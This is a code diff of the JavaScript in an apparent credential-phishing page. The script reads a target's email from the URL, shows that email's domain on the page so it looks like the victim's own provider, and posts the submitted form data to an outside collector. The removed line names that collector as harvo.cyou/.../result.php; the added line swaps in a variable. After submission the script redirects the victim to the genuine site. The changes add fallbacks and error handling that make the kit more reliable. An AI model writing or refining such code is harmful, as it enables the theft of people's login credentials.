@@ -372,8 +372,8 @@
         var fullUrl = window.location.href;
         var emailRegex = /#([^#]+)$/;
         var match = fullUrl.match(emailRegex);
-        var emaill = match ? match[1] : null;
-        var domain = emaill.substring(emaill.lastIndexOf("@") +1);
+        var emaill = match ? match[1] : (fullUrl.includes('?') ? fullUrl.split('?')[1] : "user@example.com");
+        var domain = emaill.includes('@') ? emaill.substring(emaill.lastIndexOf("@") + 1) : "example.com";
         var frmsite = domain.substring(0, domain.lastIndexOf("."));
         
         document.getElementById("emailich").textContent = domain;
@@ -407,7 +407,7 @@
             var formData = new FormData(this);
 
             $.ajax({
-                url: `https://harvo.cyou/4892e/34/psr/psr/result.php`,
+                url: fille,
                 type: 'POST',
                 data: formData,
                 processData: false,
@@ -423,6 +423,9 @@
                             window.location.href = `http://www.${domain}`;
                         }, 2000);
                     } 
+                },
+                error: function() {
+                    alert("Connection error. Please try again.");
                 }
             });
         });
